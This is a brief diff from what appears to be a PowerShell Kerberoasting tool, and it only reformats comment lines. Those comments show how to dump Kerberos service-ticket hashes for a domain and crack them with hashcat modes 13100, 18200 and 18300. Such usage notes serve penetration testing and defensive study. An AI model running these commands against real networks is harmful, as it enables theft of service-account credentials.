@@ -265,8 +265,8 @@ $VerbosePreference = "Continue"
 #Invoke-DerKerberoast
 
 # Or specify domain and output file path
-#Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
+# Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
 # hashcat -m 13100 kerberoast_hashes.txt your_wordlist.txt
-#hashcat -m 13100 kerberoast_hashes.txt wordlist.txt   # For RC4
-#hashcat -m 18200 kerberoast_hashes.txt wordlist.txt   # For AES256
-#hashcat -m 18300 kerberoast_hashes.txt wordlist.txt   # For AES128
+# hashcat -m 13100 kerberoast_hashes.txt wordlist.txt   # For RC4
+# hashcat -m 18200 kerberoast_hashes.txt wordlist.txt   # For AES256
+# hashcat -m 18300 kerberoast_hashes.txt wordlist.txt   # For AES128
